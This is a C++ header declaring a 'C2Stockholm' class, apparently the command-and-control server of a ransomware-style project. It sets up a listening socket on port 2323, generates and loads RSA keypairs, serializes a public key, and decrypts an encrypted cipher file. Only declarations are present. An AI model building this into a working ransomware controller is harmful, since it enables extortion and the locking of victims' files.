#pragma once

#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <memory>
#include <filesystem>
#include <string>
#include <cstring>
#include <algorithm>
#include <openssl/rsa.h> // sudo apt install libssl-dev
#include <openssl/pem.h>
#include <fstream>
#include <vector>
#include "constants.hpp"

#define DEFAULT_PORT 2323
#define DEFAULT_IP "0.0.0.0"

#define PRIVATE_KEY "private.pem"
#define PUBLIC_KEY "public.pem"
#define ENCRYPTED_FILE "encrypted.bin"

#define RED "\033[31m [-] "
#define GREEN "\033[32m [+] "
#define YELLOW "\033[33m [!] "
#define CYAN "\033[36m"
#define MAGENTA "\033[35m [DEBUG] "
#define RESET "\033[0m"

class C2Stockholm {
public:
    C2Stockholm(std::string __ip, int __port);
    ~C2Stockholm() = default;
    int run(CommandCode cmd);
    void cleanup();
private:
    int init(); // Initialize the socket and start listening
    int sockfd_;
    struct sockaddr_in server_addr_;
    std::string ip_;
    int port_;
    std::string decrypted_cipher_;
    std::vector<unsigned char> encrypted_cipher_;
    std::string public_key_;
    int generate_keypair();
    EVP_PKEY* load_private_key();
    EVP_PKEY* load_public_key();
    int rsa_decrypt(EVP_PKEY* private_key, const std::vector<unsigned char>& cipher);
    long serialize_publickey(EVP_PKEY* key);
    std::streamsize get_file_size();
};